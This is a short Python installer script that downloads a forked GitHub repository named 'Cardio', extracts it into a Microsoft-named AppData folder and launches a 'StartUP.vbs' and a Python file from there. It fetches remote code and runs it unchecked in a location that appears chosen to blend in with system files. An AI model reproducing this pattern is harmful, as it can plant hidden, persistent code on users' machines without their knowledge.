import urllib.request
import os
import sys
os.system("cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft")
print("#-----------------------------------------------------------------------------------#")
print("You must fork the repository to begin with and then enter your username here exactly!")
print("#-----------------------------------------------------------------------------------#")
USER = input("GitHub USERNAME :")
urllib.request.urlretrieve(f"https://github.com/{USER}/Cardio/archive/refs/heads/main.zip", "Cardio.zip")
os.system('copy Cardio.zip C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft')
os.system('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft && powershell -command "Expand-Archive Cardio.zip"')
os.system('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Cardio\\Cardio-main && start StartUP.vbs && start Message.py')
os.system('exit')
